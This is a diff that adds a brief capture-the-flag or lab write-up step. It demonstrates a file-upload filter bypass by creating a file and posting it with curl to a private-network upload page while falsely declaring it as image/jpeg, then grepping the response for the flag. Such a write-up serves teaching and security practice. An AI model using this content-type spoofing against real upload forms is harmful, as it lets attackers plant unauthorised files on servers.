@@ -1,0 +1,7 @@
+Create the file localy:
+
+touch /tmp/some_danger_file.file
+
+Make the upload using curl. The point is we tell the server that we are about to upload an image but instead we give any other file.
+
+curl -s -X POST -F "uploaded=@/tmp/some_danger_file.file;type=image/jpeg" -F "Upload=Upload" "http://10.111.1.21/index.php?page=upload" | grep flag
